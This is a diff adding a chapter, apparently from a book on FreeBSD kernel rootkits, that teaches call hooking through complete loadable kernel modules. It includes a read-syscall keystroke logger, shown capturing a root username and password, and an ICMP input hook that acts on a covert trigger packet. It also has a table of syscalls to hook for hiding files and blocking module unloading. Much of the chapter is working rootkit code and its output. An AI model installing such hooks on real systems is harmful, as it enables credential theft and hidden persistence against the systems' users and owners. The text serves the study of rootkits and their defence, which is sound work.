@@ -1,0 +1,365 @@
+<html><head></head><body><div class="chapter" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="hooking"/>Chapter 2. HOOKING</h1></div></div></div><p>We'll start our discussion of kernel-mode rootkits with call hooking, or simply hooking, which is arguably the most popular rootkit technique.<a id="IDX-CHP-2-0109" class="indexterm"/></p><p><span class="emphasis"><em>Hooking</em></span> is a programming technique that employs handler functions (called <span class="emphasis"><em>hooks</em></span>) to modify control flow. A new hook registers its address as the location for a specific function, so that when that function is called, the hook is run instead. Typically, a hook will call the original function at some point in order to preserve the original behavior. <a class="xref" href="ch02.html#normal_execution_versus_hooked_execution" title="Figure 2-1. Normal execution versus hooked execution">Figure 2-1</a> illustrates the control flow of a subroutine before and after installing a call hook.</p><div class="figure"><a id="normal_execution_versus_hooked_execution"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject2_d1e1996"/><img src="tagoreillycom20090804nostarchimages313930.png" alt="Normal execution versus hooked execution"/></div></div><p class="title"><b>Figure 2-1. Normal execution versus hooked execution</b></p></div><br class="figure-break"/><p>As you can see, hooking is used to extend (or decrease) the functionality of a subroutine. In terms of rootkit design, hooking is used to alter the results of the operating system's application programming interfaces (APIs), most commonly those involved with bookkeeping and reporting.<a id="IDX-CHP-2-0110" class="indexterm"/></p><p>Now, let's start abusing the KLD interface.</p><div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="hooking_a_system_call"/>Hooking a System Call</h1></div></div></div><p>Recall from <a class="xref" href="ch01.html" title="Chapter 1. LOADABLE KERNEL MODULES">Chapter 1</a> that a system call is the entry point through which an application program requests service from the operating system's kernel. By hooking these entry points, a rootkit can alter the data the kernel returns to any or every user space process. In fact, hooking system calls is so effective that most (publicly available) rootkits employ it in some way.<a id="IDX-CHP-2-0115" class="indexterm"/><a id="IDX-CHP-2-0111" class="indexterm"/><a id="IDX-CHP-2-0112" class="indexterm"/><a id="IDX-CHP-2-0113" class="indexterm"/><a id="IDX-CHP-2-0114" class="indexterm"/></p><p>In FreeBSD, a system call hook is installed by registering its address as the system call function within the target system call's <code class="literal">sysent</code> structure (which is located within <code class="literal">sysent[]</code>).</p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>For more on system calls, see <a class="xref" href="ch01s04.html" title="System Call Modules">System Call Modules</a>.</p></div><p>Listing 2-1 is an example system call hook (albeit a trivial one) designed to output a debug message whenever a user space process calls the <code class="literal">mkdir</code> system call—in other words, whenever a directory is created.</p><a id="I_programlisting2_d1e2063"/><pre class="programlisting">
+#include &lt;sys/types.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/proc.h&gt;
+#include &lt;sys/module.h&gt;
+#include &lt;sys/sysent.h&gt;
+#include &lt;sys/kernel.h&gt;
+#include &lt;sys/systm.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/sysproto.h&gt;
+
+/* mkdir system call hook. */
+static int
+mkdir_hook(struct thread *td, void *syscall_args)
+{
+
+      struct mkdir_args /* {
+                char    *path;
+                int     mode;
+        } */ *uap;
+        uap = (struct mkdir_args *)syscall_args;
+
+        char path[255];
+        size_t done;
+        int error;
+
+        error = copyinstr(uap-&gt;path, path, 255, &amp;done);
+        if (error != 0)
+                return(error);
+
+        /* Print a debug message. */
+        uprintf("The directory \"%s\" will be created with the following"
+            " permissions: %o\n", path, uap-&gt;mode);
+
+        return(mkdir(td, syscall_args));
+}
+
+/* The function called at load/unload. */
+static int
+load(struct module *module, int cmd, void *arg)
+{
+        int error = 0;
+
+        switch (cmd) {
+        case MOD_LOAD:
+                /* Replace mkdir with mkdir_hook. */
+                ❶sysent[❷SYS_mkdir].sy_call = (sy_call_t *)mkdir_hook;
+                break;
+
+        case MOD_UNLOAD:
+                /* Change everything back to normal. */
+                ❸sysent[SYS_mkdir].sy_call = (sy_call_t *)mkdir;
+                break;
+
+        default:
+                error = EOPNOTSUPP;
+                break;
+        }
+
+        return(error);
+}
+
+static moduledata_t mkdir_hook_mod = {
+        "mkdir_hook",           /* module name */
+        load,                   /* event handler */
+        NULL                    /* extra data */
+};
+
+DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+</pre><p><span class="emphasis"><em>Listing 2-1: mkdir_hook.c</em></span></p><p>Notice that upon module load, the event handler ❶ registers <code class="literal">mkdir_hook</code> (which simply prints a debug message and then calls <code class="literal">mkdir</code>) as the <code class="literal">mkdir</code> system call function. This single line installs the system call hook. To remove the hook, simply ❸ reinstate the original <code class="literal">mkdir</code> system call function upon module unload.</p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>The constant ❷ <em class="replaceable"><code>SYS_mkdir</code></em> is defined as the offset value for the <em class="replaceable"><code>mkdir</code></em> system call. This constant is defined in the <em class="replaceable"><code>&lt;sys/syscall.h&gt;</code></em> header, which also contains a complete listing of all in-kernel system call numbers.</p></div><p>The following output shows the results of executing <code class="literal">mkdir(1)</code> after loading <code class="literal">mkdir_hook</code>.</p><a id="I_programlisting2_d1e2102"/><pre class="programlisting">
+$ <strong class="userinput"><code>sudo kldload ./mkdir_hook.ko</code></strong>
+$ <strong class="userinput"><code>mkdir test</code></strong>
+The directory "test" will be created with the following permissions: 777
+$ <strong class="userinput"><code>ls -l</code></strong>
+. . .
+drwxr-xr-x  2 ghost  ghost   512 Mar 22 08:40 test
+</pre><p>As you can see, <code class="literal">mkdir(1)</code> is now a lot more verbose.<sup>[<a id="CHP-2-FN-1" href="#ftn.CHP-2-FN-1" class="footnote">1</a>]</sup></p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a id="ftn.CHP-2-FN-1" href="#CHP-2-FN-1" class="para">1</a>] </sup><sup>1</sup> For you astute readers, yes, I have a umask of 022, which is why the permissions for "test" are 755, not 777.</p></div></div></div>
+<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="keystroke_logging"/>Keystroke Logging</h1></div></div></div><p>Now let's look at a more interesting (but still somewhat trivial) example of a system call hook.<a id="IDX-CHP-2-0116" class="indexterm"/><a id="IDX-CHP-2-0117" class="indexterm"/><a id="IDX-CHP-2-0118" class="indexterm"/></p><p><span class="emphasis"><em>Keystroke logging</em></span> is the simple act of intercepting and capturing a user's keystrokes. In FreeBSD, this can be accomplished by hooking the <code class="literal">read</code> system call.<sup>[<a id="CHP-2-FN-2" href="#ftn.CHP-2-FN-2" class="footnote">2</a>]</sup> As its name implies, this call is responsible for reading in input. Here is its C library definition:<a id="IDX-CHP-2-0119" class="indexterm"/></p><a id="I_programlisting2_d1e2176"/><pre class="programlisting">
+#include &lt;sys/types.h&gt;
+#include &lt;sys/uio.h&gt;
+#include &lt;unistd.h&gt;
+
+ssize_t
+read(int fd, void *buf, size_t nbytes);
+</pre><p>The <code class="literal">read</code> system call reads in <code class="literal">nbytes</code> of data from the object referenced by the descriptor <code class="literal">fd</code> into the buffer <code class="literal">buf</code>. Therefore, in order to capture a user's keystrokes, you simply have to save the contents of <code class="literal">buf</code> (before returning from a <code class="literal">read</code> call) whenever <code class="literal">fd</code> points to standard input (i.e., file descriptor 0).</p><p>For example, take a look at Listing 2-2:</p><a id="I_programlisting2_d1e2204"/><pre class="programlisting">
+#include &lt;sys/types.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/proc.h&gt;
+#include &lt;sys/module.h&gt;
+#include &lt;sys/sysent.h&gt;
+#include &lt;sys/kernel.h&gt;
+#include &lt;sys/systm.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/sysproto.h&gt;
+
+
+/*
+ * read system call hook.
+ * Logs all keystrokes from stdin.
+ * Note: This hook does not take into account special characters, such as
+ * Tab, Backspace, and so on.
+ */
+static int
+read_hook(struct thread *td, void *syscall_args)
+{
+        struct read_args /* {
+                int     fd;
+                void    *buf;
+                size_t  nbyte;
+        } */ *uap;
+        uap = (struct read_args *)syscall_args;
+
+        int error;
+        char buf[1];
+        int done;
+
+        ❶error = read(td, syscall_args);
+
+        ❷if (error || (!uap-&gt;nbyte) || (uap-&gt;nbyte &gt; 1) || (uap-&gt;fd != 0))
+                ❸return(error);
+
+        ❹copyinstr(uap-&gt;buf, buf, 1, &amp;done);
+        printf("%c\n", buf[0]);
+
+        return(error);
+}
+
+/* The function called at load/unload. */
+static int
+load(struct module *module, int cmd, void *arg)
+{
+        int error = 0;
+
+        switch (cmd) {
+        case MOD_LOAD:
+                /* Replace read with read_hook. */
+                sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
+                break;
+
+        case MOD_UNLOAD:
+                /* Change everything back to normal. */
+                sysent[SYS_read].sy_call = (sy_call_t *)read;
+                break;
+
+        default:
+                error = EOPNOTSUPP;
+                break;
+        }
+
+        return(error);
+}
+
+static moduledata_t read_hook_mod = {
+        "read_hook",            /* module name */
+        load,                   /* event handler */
+        NULL                    /* extra data */
+};
+
+DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+</pre><p><span class="emphasis"><em>Listing 2-2: read_hook.c</em></span></p><p>In Listing 2-2 the function <code class="literal">read_hook</code> first ❶ calls <code class="literal">read</code> to read in the data from <code class="literal">fd</code>. If this data is ❷ not a keystroke (which is defined as one character or one byte in size) originating from standard input, then ❸ <code class="literal">read_hook</code> returns. Otherwise, the data (i.e., keystroke) is ❹ copied into a local buffer, effectively "capturing" it.</p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>In the interest of saving space (and keeping things simple), <em class="replaceable"><code>read_hook</code></em> simply dumps the captured keystroke(s) to the system console.</p></div><p>Here are the results from logging into a system after loading <code class="literal">read_hook</code>:</p><a id="I_programlisting2_d1e2235"/><pre class="programlisting">
+login: <strong class="userinput"><code>root</code></strong>
+Password:
+Last login: Mon Mar 4 00:29:14 on ttyv2
+
+
+root@alpha ~# <strong class="userinput"><code>dmesg | tail -n 32</code></strong>
+r
+o
+o
+t
+
+p
+a
+s
+s
+w
+d
+. . .
+</pre><p>As you can see, my login credentials—my username (<code class="literal">root</code>) and password (<code class="literal">passwd</code>)<sup>[<a id="CHP-2-FN-3" href="#ftn.CHP-2-FN-3" class="footnote">3</a>]</sup>—have been captured. At this point, you should be able to hook any system call. However, one question remains: If you aren't a kernel guru, how do you determine which system call(s) to hook? The answer is: you use kernel process tracing.<a id="IDX-CHP-2-0120" class="indexterm"/><a id="IDX-CHP-2-0121" class="indexterm"/></p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a id="ftn.CHP-2-FN-2" href="#CHP-2-FN-2" class="para">2</a>] </sup><sup>2</sup> Actually, to create a full-fledged keystroke logger, you would have to hook <code class="literal">read</code>, <code class="literal">readv</code>, <code class="literal">pread</code>, and <code class="literal">preadv</code>.</p></div><div class="footnote"><p><sup>[<a id="ftn.CHP-2-FN-3" href="#CHP-2-FN-3" class="para">3</a>] </sup><sup>3</sup> Obviously, this is not my real root password.</p></div></div></div>
+<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="kernel_process_tracing"/>Kernel Process Tracing</h1></div></div></div><p><span class="emphasis"><em>Kernel process tracing</em></span> is a diagnostic and debugging technique used to intercept and record each kernel operation—that is, every system call, namei translation, I/O, signal processed, and context switch performed on behalf of a specific running process. In FreeBSD, this is done with the <code class="literal">ktrace(1)</code> and <code class="literal">kdump(1)</code> utilities. For example:<a id="IDX-CHP-2-0122" class="indexterm"/><a id="IDX-CHP-2-0123" class="indexterm"/></p><a id="I_programlisting2_d1e2288"/><pre class="programlisting">
+$ <strong class="userinput"><code>ktrace ls</code></strong>
+file1           file2           ktrace.out
+$ <strong class="userinput"><code>kdump</code></strong>
+   517 ktrace   RET   ktrace 0
+   517 ktrace   CALL  execve(0xbfbfe790,0xbfbfecdc,0xbfbfece4)
+   517 ktrace   NAMI  "/sbin/ls"
+   517 ktrace   RET   execve -1 errno 2 No such file or directory
+   517 ktrace   CALL  execve(0xbfbfe790,0xbfbfecdc,0xbfbfece4)
+   517 ktrace   NAMI  "/bin/ls"
+   517 ktrace   NAMI  "/libexec/ld-elf.so.1"
+   517 ls       RET   execve 0
+. . .
+   517 ls       CALL  ❶getdirentries(0x5,0x8054000,0x1000,0x8053014)
+   517 ls       RET   getdirentries 512/0x200
+   517 ls       CALL  getdirentries(0x5,0x8054000,0x1000,0x8053014)
+   517 ls       RET   getdirentries 0
+   517 ls       CALL  ❷lseek(0x5,0,0,0,0)
+   517 ls       RET   lseek 0
+   517 ls       CALL  ❸close(0x5)
+   517 ls       RET   close 0
+   517 ls       CALL  ❹fchdir(0x4)
+   517 ls       RET   fchdir 0
+   517 ls       CALL  close(0x4)
+   517 ls       RET   close 0
+   517 ls       CALL  fstat(0x1,0xbfbfdea0)
+   517 ls       RET   fstat 0
+   517 ls       CALL  break(0x8056000)
+   517 ls       RET   break 0
+   517 ls       CALL  ioctl(0x1,TIOCGETA,0xbfbfdee0)
+   517 ls       RET   ioctl 0
+   517 ls       CALL  write(0x1,0x8055000,0x19)
+   517 ls       GIO   fd 1 wrote 25 bytes
+       "file1           file2           ktrace.out
+       "
+   517 ls       RET   write 25/0x19
+   517 ls       CALL  exit(0)
+</pre><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>In the interest of being concise, any output irrelevant to this discussion is omitted.</p></div><p>As the preceding example shows, the <code class="literal">ktrace(1)</code> utility enables kernel trace logging for a specific process [in this case,<code class="literal">ls(1)</code>],while <code class="literal">kdump(1)</code> displays the trace data.</p><p>Notice the various system calls that <code class="literal">ls(1)</code> issues during its execution, such as ❶<code class="literal">getdirentries</code>, ❷<code class="literal">lseek</code>, ❸<code class="literal">close</code>, ❹<code class="literal">fchdir</code>, and so on. This means that you can affect the operation and/or output of <code class="literal">ls(1)</code> by hooking one or more of these calls.</p><p>The main point to all of this is that when you want to alter a specific process and you don't know which system call(s) to hook, you just need to perform a kernel trace.</p></div>
+<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="common_system_call_hooks"/>Common System Call Hooks</h1></div></div></div><p>For the sake of being thorough, <a class="xref" href="ch02s04.html#common_system_call_hooks-id1" title="Table 2-1. Common System Call Hooks">Table 2-1</a> outlines some of the most common system call hooks.<a id="IDX-CHP-2-0125" class="indexterm"/><a id="IDX-CHP-2-0124" class="indexterm"/></p><div class="table"><a id="common_system_call_hooks-id1"/><p class="title"><b>Table 2-1. Common System Call Hooks</b></p><div class="table-contents"><table summary="Common System Call Hooks" style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><thead><tr><th style="text-align: left" valign="bottom"><p>System Call</p></th><th style="text-align: left" valign="bottom"><p>Purpose of Hook</p></th></tr></thead><tbody><tr><td style="text-align: left" valign="top"><p><code class="literal">read</code>, <code class="literal">readv</code>, <code class="literal">pread</code>, <code class="literal">preadv</code></p></td><td style="text-align: left" valign="top"><p>Logging input</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">write</code>,<code class="literal">writev</code>,<code class="literal">pwrite</code>, <code class="literal">pwritev</code></p></td><td style="text-align: left" valign="top"><p>Logging output</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">open</code></p></td><td style="text-align: left" valign="top"><p>Hiding file contents</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">unlink</code></p></td><td style="text-align: left" valign="top"><p>Preventing file removal</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">chdir</code></p></td><td style="text-align: left" valign="top"><p>Preventing directory traversal</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">chmod</code></p></td><td style="text-align: left" valign="top"><p>Preventing file mode modification</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">chown</code></p></td><td style="text-align: left" valign="top"><p>Preventing ownership change</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">kill</code></p></td><td style="text-align: left" valign="top"><p>Preventing signal sending</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">ioctl</code></p></td><td style="text-align: left" valign="top"><p>Manipulating <code class="literal">ioctl</code> requests</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">execve</code></p></td><td style="text-align: left" valign="top"><p>Redirecting file execution</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">rename</code></p></td><td style="text-align: left" valign="top"><p>Preventing file renaming</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">rmdir</code></p></td><td style="text-align: left" valign="top"><p>Preventing directory removal</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">stat</code>, <code class="literal">lstat</code></p></td><td style="text-align: left" valign="top"><p>Hiding file status</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">getdirentries</code></p></td><td style="text-align: left" valign="top"><p>Hiding files</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">truncate</code></p></td><td style="text-align: left" valign="top"><p>Preventing file truncating or extending</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">kldload</code></p></td><td style="text-align: left" valign="top"><p>Preventing module loading</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">kldunload</code></p></td><td style="text-align: left" valign="top"><p>Preventing module unloading</p></td></tr></tbody></table></div></div><br class="table-break"/><p>Now let's look at some of the other kernel functions that you can hook.</p></div>
+<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="communication_protocols"/>Communication Protocols</h1></div></div></div><p>As its name implies, a <span class="emphasis"><em>communication protocol</em></span> is a set of rules and conventions used by two communicating processes (for example, the TCP/IP protocol suite). In FreeBSD, a communication protocol is defined by its entries in a protocol switch table. As such, by modifying these entries, a rootkit can alter the data sent and received by either communication endpoint. To better illustrate this "attack" allow me to digress.<a id="IDX-CHP-2-0157" class="indexterm"/><a id="IDX-CHP-2-0126" class="indexterm"/><a id="IDX-CHP-2-0127" class="indexterm"/><a id="IDX-CHP-2-0128" class="indexterm"/><a id="IDX-CHP-2-0129" class="indexterm"/><a id="IDX-CHP-2-0130" class="indexterm"/><a id="IDX-CHP-2-0131" class="indexterm"/><a id="IDX-CHP-2-0132" class="indexterm"/><a id="IDX-CHP-2-0133" class="indexterm"/><a id="IDX-CHP-2-0134" class="indexterm"/><a id="IDX-CHP-2-0135" class="indexterm"/><a id="IDX-CHP-2-0136" class="indexterm"/><a id="IDX-CHP-2-0137" class="indexterm"/><a id="IDX-CHP-2-0138" class="indexterm"/><a id="IDX-CHP-2-0139" class="indexterm"/><a id="IDX-CHP-2-0140" class="indexterm"/><a id="IDX-CHP-2-0141" class="indexterm"/><a id="IDX-CHP-2-0142" class="indexterm"/><a id="IDX-CHP-2-0143" class="indexterm"/><a id="IDX-CHP-2-0144" class="indexterm"/><a id="IDX-CHP-2-0145" class="indexterm"/><a id="IDX-CHP-2-0146" class="indexterm"/><a id="IDX-CHP-2-0147" class="indexterm"/><a id="IDX-CHP-2-0148" class="indexterm"/><a id="IDX-CHP-2-0149" class="indexterm"/><a id="IDX-CHP-2-0150" class="indexterm"/><a id="IDX-CHP-2-0151" class="indexterm"/><a id="IDX-CHP-2-0152" class="indexterm"/><a id="IDX-CHP-2-0153" class="indexterm"/><a id="IDX-CHP-2-0154" class="indexterm"/><a id="IDX-CHP-2-0155" class="indexterm"/><a id="IDX-CHP-2-0156" class="indexterm"/></p><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_protosw_structure"/>The protosw Structure</h2></div></div></div><p>The context of each protocol switch table is maintained in a <code class="literal">protosw</code> structure, which is defined in the <code class="literal">&lt;sys/protosw.h&gt;</code> header as follows:<a id="IDX-CHP-2-0158" class="indexterm"/></p><a id="I_programlisting2_d1e2714"/><pre class="programlisting">
+struct protosw {
+        short   pr_type;                /* socket type */
+        struct  domain *pr_domain;      /* domain protocol */
+        short   pr_protocol;            /* protocol number */
+        short   pr_flags;
+/* protocol-protocol hooks */
+        pr_input_t *pr_input;           /* input to protocol (from below) */
+        pr_output_t *pr_output;         /* output to protocol (from above) */
+        pr_ctlinput_t *pr_ctlinput;     /* control input (from below) */
+        pr_ctloutput_t *pr_ctloutput;   /* control output (from above) */
+/* user-protocol hook */
+        pr_usrreq_t     *pr_ousrreq;
+/* utility hooks */
+        pr_init_t *pr_init;
+        pr_fasttimo_t *pr_fasttimo;     /* fast timeout (200ms) */
+        pr_slowtimo_t *pr_slowtimo;     /* slow timeout (500ms) */
+        pr_drain_t *pr_drain;           /* flush any excess space possible */
+
+        struct  pr_usrreqs *pr_usrreqs; /* supersedes pr_usrreq() */
+};
+</pre><p><a class="xref" href="ch02s05.html#protocol_switch_table_entry_points" title="Table 2-2. Protocol Switch Table Entry Points">Table 2-2</a> defines the entry points in <code class="literal">struct protosw</code> that you'll need to know in order to modify a communication protocol.</p><div class="table"><a id="protocol_switch_table_entry_points"/><p class="title"><b>Table 2-2. Protocol Switch Table Entry Points</b></p><div class="table-contents"><table summary="Protocol Switch Table Entry Points" style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><thead><tr><th style="text-align: left" valign="bottom"><p>Entry Point</p></th><th style="text-align: left" valign="bottom"><p>Description</p></th></tr></thead><tbody><tr><td style="text-align: left" valign="top"><p><code class="literal">pr_init</code></p></td><td style="text-align: left" valign="top"><p>Initialization routine</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">pr_input</code></p></td><td style="text-align: left" valign="top"><p>Pass data up toward the user</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">pr_output</code></p></td><td style="text-align: left" valign="top"><p>Pass data down toward the network</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">pr_ctlinput</code></p></td><td style="text-align: left" valign="top"><p>Pass control information up</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">pr_ctloutput</code></p></td><td style="text-align: left" valign="top"><p>Pass control information down</p></td></tr></tbody></table></div></div><br class="table-break"/></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_inetsw_open_square_close_square_switch_table"/>The inetsw[ ] Switch Table</h2></div></div></div><p>Each communication protocol's <code class="literal">protosw</code> structure is defined in the file/sys/netinet/in_proto.c. Here is a snippet from this file:<a id="IDX-CHP-2-0159" class="indexterm"/><a id="IDX-CHP-2-0160" class="indexterm"/></p><a id="I_programlisting2_d1e2793"/><pre class="programlisting">
+struct protosw ❶inetsw[] = {
+{
+        .pr_type =              0,
+        .pr_domain =            &amp;inetdomain,
+        .pr_protocol =          IPPROTO_IP,
+        .pr_init =              ip_init,
+        .pr_slowtimo =          ip_slowtimo,
+        .pr_drain =             ip_drain,
+        .pr_usrreqs =           &amp;nousrreqs
+},
+{
+        .pr_type =              SOCK_DGRAM,
+        .pr_domain =            &amp;inetdomain,
+        .pr_protocol =          IPPROTO_UDP,
+        .pr_flags =             PR_ATOMIC|PR_ADDR,
+        .pr_input =             udp_input,
+        .pr_ctlinput =          udp_ctlinput,
+        .pr_ctloutput =         ip_ctloutput,
+        .pr_init =              udp_init,
+        .pr_usrreqs =           &amp;udp_usrreqs
+},
+{
+        .pr_type =              SOCK_STREAM,
+        .pr_domain =            &amp;inetdomain,
+        .pr_protocol =          IPPROTO_TCP,
+        .pr_flags =             PR_CONNREQUIRED|PR_IMPLOPCL|PR_WANTRCVD,
+        .pr_input =             tcp_input,
+        .pr_ctlinput =          tcp_ctlinput,
+        .pr_ctloutput =         tcp_ctloutput,
+        .pr_init =              tcp_init,
+        .pr_slowtimo =          tcp_slowtimo,
+        .pr_drain =             tcp_drain,
+        .pr_usrreqs =           &amp;tcp_usrreqs
+},
+. . .
+</pre><p>Notice that every protocol switch table is defined within ❶ <code class="literal">inetsw[]</code>. This means that in order to modify a communication protocol, you have to go through <code class="literal">inetsw[]</code>.</p></div><div class="sect2" xml:lang="en"><div class="titlepage"><div><div><h2 class="title"><a id="the_mbuf_structure"/>The mbuf Structure</h2></div></div></div><p>Data (and control information) that is passed between two communicating processes is stored within an <code class="literal">mbuf</code> structure, which is defined in the <code class="literal">&lt;sys/mbuf.h&gt;</code> header. To be able to read and modify this data, there are two fields in <code class="literal">struct mbuf</code> that you'll need to know: <code class="literal">m_len</code>, which identifies the amount of data contained within the <code class="literal">mbuf</code>, and <code class="literal">m_data</code>, which points to the data.<a id="IDX-CHP-2-0165" class="indexterm"/><a id="IDX-CHP-2-0161" class="indexterm"/><a id="IDX-CHP-2-0162" class="indexterm"/><a id="IDX-CHP-2-0163" class="indexterm"/><a id="IDX-CHP-2-0164" class="indexterm"/></p></div></div>
+<div class="sect1" xml:lang="en"><div class="titlepage"><div><div><h1 class="title"><a id="hooking_a_communication_protocol"/>Hooking a Communication Protocol</h1></div></div></div><p>Listing 2-3 is an example communication protocol hook designed to output a debug message whenever an Internet Control Message Protocol (ICMP) redirect for Type of Service and Host message containing the phrase <span class="emphasis"><em>Shiny</em></span> is received.<a id="IDX-CHP-2-0166" class="indexterm"/></p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>An ICMP redirect for Type of Service and Host message contains a type field of 5 and a code field of 3.</p></div><a id="I_programlisting2_d1e2865"/><pre class="programlisting">
+#include &lt;sys/param.h&gt;
+#include &lt;sys/proc.h&gt;
+#include &lt;sys/module.h&gt;
+#include &lt;sys/kernel.h&gt;
+#include &lt;sys/systm.h&gt;
+#include &lt;sys/mbuf.h&gt;
+#include &lt;sys/protosw.h&gt;
+
+#include &lt;netinet/in.h&gt;
+#include &lt;netinet/in_systm.h&gt;
+#include &lt;netinet/ip.h&gt;
+#include &lt;netinet/ip_icmp.h&gt;
+#include &lt;netinet/ip_var.h&gt;
+#define TRIGGER "Shiny."
+
+extern struct protosw inetsw[];
+pr_input_t icmp_input_hook;
+
+/* icmp_input hook. */
+void
+icmp_input_hook(struct mbuf *m, int off)
+{
+        struct icmp *icp;
+        ❶int hlen = off;
+
+        /* Locate the ICMP message within m. */
+        m-&gt;m_len -= hlen;
+        ❷m-&gt;m_data += hlen;
+
+        /* Extract the ICMP message. */
+        ❸icp = mtod(m, struct icmp *);
+
+        /* Restore m. */
+        ❹m-&gt;m_len += hlen;
+        m-&gt;m_data -= hlen;
+
+        /* Is this the ICMP message we are looking for? */
+        if (icp-&gt;icmp_type == ICMP_REDIRECT &amp;&amp;
+            icp-&gt;icmp_code == ICMP_REDIRECT_TOSHOST &amp;&amp;
+            strncmp(icp-&gt;icmp_data, TRIGGER, 6) == 0)
+                 ❺printf("Let's be bad guys.\n");
+        else
+                icmp_input(m, off);
+}
+
+/* The function called at load/unload. */
+static int
+load(struct module *module, int cmd, void *arg)
+{
+        int error = 0;
+
+        switch (cmd) {
+        case MOD_LOAD:
+                /* Replace icmp_input with icmp_input_hook. */
+                ❻inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
+                break;
+
+        case MOD_UNLOAD:
+                /* Change everything back to normal. */
+                ❼inetsw[❽ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
+                break;
+
+        default:
+                error = EOPNOTSUPP;
+                break;
+        }
+
+        return(error);
+}
+
+static moduledata_t icmp_input_hook_mod = {
+        "icmp_input_hook",      /* module name */
+        load,                   /* event handler */
+        NULL                    /* extra data */
+};
+
+DECLARE_MODULE(icmp_input_hook, icmp_input_hook_mod, SI_SUB_DRIVERS,
+     SI_ORDER_MIDDLE);
+</pre><p><span class="emphasis"><em>Listing 2-3: icmp_input_hook.c</em></span></p><p>In Listing 2-3 the function <code class="literal">icmp_input_hook</code> first ❶ sets <code class="literal">hlen</code> to the received ICMP message's IP header length (<code class="literal">off</code>). Next, the location of the ICMP message within <code class="literal">m</code> is determined; keep in mind that an ICMP message is transmitted within an IP datagram, which is why ❷<code class="literal">m_data</code> is increased by <code class="literal">hlen</code>. Next, the ICMP message is ❸extracted from <code class="literal">m</code>. Thereafter, the changes made to <code class="literal">m</code> are ❹ reversed, so that when <code class="literal">m</code> is actually processed, it's as if nothing even happened. Finally, if the ICMP message is the one we are looking for, ❺ a debug message is printed; otherwise, <code class="literal">icmp_input</code> is called.</p><p>Notice that upon module load, the event handler ❻ registers <code class="literal">icmp_input_hook</code> as the <code class="literal">pr_input</code> entry point within the ICMP switch table. This single line installs the communication protocol hook. To remove the hook, simply ❼ reinstate the original <code class="literal">pr_input</code> entry point (which is <code class="literal">icmp_input</code>, in this case) upon module unload.</p><div class="note" style="margin-left: 0.5in; margin-right: 0.5in;"><h3 class="title">Note</h3><p>The value of ❽<em class="replaceable"><code>ip_protox[IPPROTO_ICMP]</code></em> is defined as the offset, within <em class="replaceable"><code>inetsw[]</code></em>, for the ICMP switch table. For more on <em class="replaceable"><code>ip_protox[]</code></em>, see the <em class="replaceable"><code>ip_init</code></em> function in /sys/netinet/ip_input.c.</p></div><p>The following output shows the results of receiving an ICMP redirect for Type of Service and Host message after loading <code class="literal">icmp_input_hook:</code></p><a id="I_programlisting2_d1e2936"/><pre class="programlisting">
+$ <strong class="userinput"><code>sudo kldload ./icmp_input_hook.ko</code></strong>
+$ <strong class="userinput"><code>echo Shiny. &gt; payload</code></strong>
+$ <strong class="userinput"><code>sudo nemesis icmp -i 5 -c 3 -P ./payload -D 127.0.0.1</code></strong>
+
+ICMP Packet Injected
+$ <strong class="userinput"><code>dmesg | tail -n 1</code></strong>
+Let's be bad guys.
